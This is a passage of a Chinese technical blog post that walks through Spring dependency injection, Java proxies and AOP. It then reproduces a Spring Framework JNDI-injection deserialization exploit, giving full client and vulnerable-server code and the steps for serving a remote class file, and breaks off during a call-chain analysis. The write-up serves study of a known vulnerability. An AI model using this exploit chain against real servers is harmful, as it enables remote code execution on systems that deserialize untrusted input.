class="meta-string">"-//SPRING//DTD BEAN//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.springframework.org/dtd/spring-beans.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"di"</span> <span class="attr">class</span>=<span class="string">"com.sw.action.DI"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- List注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Set注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"set"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Map注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>one<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>two<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>three<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Properties注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>one<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>two<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span>three<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调用函数取出内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sw.action.DI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDI</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ApplicationContext actx = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">    <span class="string">"config-di.xml"</span>);</span><br><span class="line">  DI di = (DI) actx.getBean(<span class="string">"di"</span>);</span><br><span class="line">  <span class="comment">// 打印这些集合</span></span><br><span class="line">  System.out.println(di.getList());</span><br><span class="line">  System.out.println(di.getSet());</span><br><span class="line">  System.out.println(di.getMap());</span><br><span class="line">  System.out.println(di.getPro());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="Spring-AOP思想"><a href="#Spring-AOP思想" class="headerlink" title="Spring AOP思想"></a>Spring AOP思想</h3><p>在写AOP前先先来写下三种Java中的代理：静态代理，动态代理，CGLIB代理</p><ul><li>静态代理：<strong>静态代理需要实现目标对象的相同接口，那么可能会导致代理类会非常非常多，维护起来相对麻烦</strong></li><li>动态代理：<strong>目标对象一定是要有接口的，没有接口就不能实现动态代理</strong></li><li>cglib代理：<strong>为了解决动态代理一定需要接口的问题，通过cglib代理代理的对象不需要接口</strong></li></ul><h4 id="手动实现AOP编程"><a href="#手动实现AOP编程" class="headerlink" title="手动实现AOP编程"></a>手动实现AOP编程</h4><p>IUser接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AOP类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理工厂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//维护目标对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//维护关键点代码的类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AOP aop;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProxyInstance</span><span class="params">(Object target_, AOP aop_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标对象和关键点代码的类都是通过外界传递进来</span></span><br><span class="line">        target = target_;</span><br><span class="line">        aop = aop_;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(),</span><br><span class="line">                <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">                        aop.begin();</span><br><span class="line">                        Object returnValue = method.invoke(target, args);</span><br><span class="line">                        aop.close();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> returnValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注解方式实现AOP"><a href="#注解方式实现AOP" class="headerlink" title="注解方式实现AOP"></a>注解方式实现AOP</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"aa"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启aop注解方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切面类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//指定为切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//里面的值为切入点表达式</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口的UserDao类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">implements</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"DB:保存用户"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext ac =</span><br><span class="line">                <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"aa/applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里得到的是代理对象....</span></span><br><span class="line">        IUser iUser = (IUser) ac.getBean(<span class="string">"userDao"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(iUser.getClass());</span><br><span class="line"></span><br><span class="line">        iUser.save();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过JNDI注入实现Spring-Framework反序列化"><a href="#通过JNDI注入实现Spring-Framework反序列化" class="headerlink" title="通过JNDI注入实现Spring Framework反序列化"></a>通过JNDI注入实现Spring Framework反序列化</h3><p>漏洞复现项目：</p><p><a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p><p>Client端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">      String localAddress= <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">      Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">      ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">      registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">      Socket socket = <span class="keyword">new</span> Socket(localAddress,port);</span><br><span class="line">      System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">      String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line"></span><br><span class="line">      org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">      object.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">      ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">      objectOutputStream.writeObject(object);</span><br><span class="line">      objectOutputStream.flush();</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">Socket socket=serverSocket.accept();</span><br><span class="line">System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());</span><br><span class="line">ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Object object = objectInputStream.readObject();</span><br><span class="line">System.out.println(<span class="string">"Read object "</span>+object);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地8000端口开启Web服务，并将ExportObject.class放在Web服务下</p><p>先运行Server端，再运行Client端</p><p><img src="https://s2.ax1x.com/2020/03/06/3b5BGt.png" alt="3b5BGt.png"></p><h4 id="漏洞调用链分析"><a href="#漏洞调用链分析" class="headerlink" title="漏洞调用链分析"></a>漏洞调用链分析</h4><p>跟进org.springframework.transaction.jta.JtaTransactionManager下readobject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">    <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">    initUserTransactionAndTransactionManager();</span><br><span class="line">    initTransactionSynchronizationRegistry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进initUserTransactionAndTransactionManager()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// Fetch JTA UserTransaction from JNDI, if necessary.</span></span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line"><span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = retrieveUserTransaction();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line"><span class="comment">// Autodetect UserTransaction at its default JNDI location.</span></span><br><span class="line"><span class="keyword">this</span>.userTransaction = findUserTransaction();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// Fetch JTA TransactionManager from JNDI, if necessary.</span></span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.transactionManagerName)) &#123;</span><br><span class="line"><span class="keyword">this</span>.transactionManager = lookupTransactionManager(<span class="keyword">this</span>.transactionManagerName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.transactionManager = retrieveTransactionManager();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectTransactionManager) &#123;</span><br><span class="line"><span class="comment">// Autodetect UserTransaction object that implements TransactionManager,</span></span><br><span class="line"><span class="comment">// and check fallback JNDI locations otherwise.</span></span><br><span class="line"><span class="keyword">this</span>.transactionManager = findTransactionManager(<span class="keyword">this</span>.userTransaction);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If only JTA TransactionManager specified, create UserTransaction handle for it.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.userTransaction = buildUserTransaction(<span class="keyword">this</span>.transactionManager);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进lookupUserTransaction函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> getJndiTemplate().lookup(userTransactionName, 